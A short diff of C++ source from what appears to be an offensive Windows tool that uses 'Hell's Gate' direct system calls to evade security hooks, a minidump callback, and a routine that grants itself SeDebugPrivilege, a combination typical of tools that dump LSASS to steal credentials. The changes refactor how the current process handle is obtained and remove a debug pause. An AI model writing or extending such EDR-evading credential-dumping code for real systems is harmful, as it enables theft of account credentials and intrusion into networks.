@@ -25,7 +25,7 @@ extern "C" NTSTATUS SysNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAcces
 
 extern "C" NTSTATUS SysNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 
-extern "C" PVOID GetHeap();
+extern "C" HANDLE GetHeap();
 
 extern "C" HANDLE CurrentProcess();
 
@@ -103,17 +103,8 @@ BOOL CALLBACK minidumpCallback(
 BOOL AddSeDebugPrivileges(PVX_TABLE pVxTable) {
 	// Get the current process handle
 	NTSTATUS status;
-	DWORD dwPid = GetCurrentProcessId();
-	HANDLE pHandle = NULL;
-	CLIENT_ID cid;
-	cid.UniqueProcess = (PVOID)dwPid;
-	cid.UniqueThread = NULL;
-	OBJECT_ATTRIBUTES oa;
-	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
-	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
-	status = SysNtOpenProcess(&pHandle, PROCESS_QUERY_INFORMATION, &oa, &cid);
 	
-	HANDLE hAsm = CurrentProcess();
+	HANDLE pHandle = CurrentProcess();
 
 	// Get the token handle with query information and adjust privileges access
 	HANDLE hTok = INVALID_HANDLE_VALUE;
@@ -156,7 +147,6 @@ BOOL AddSeDebugPrivileges(PVX_TABLE pVxTable) {
 	SysNtClose(hTok);
 	pHandle = nullptr;
 	hTok = nullptr;
-	getchar();
 	return bRes;
 }
 
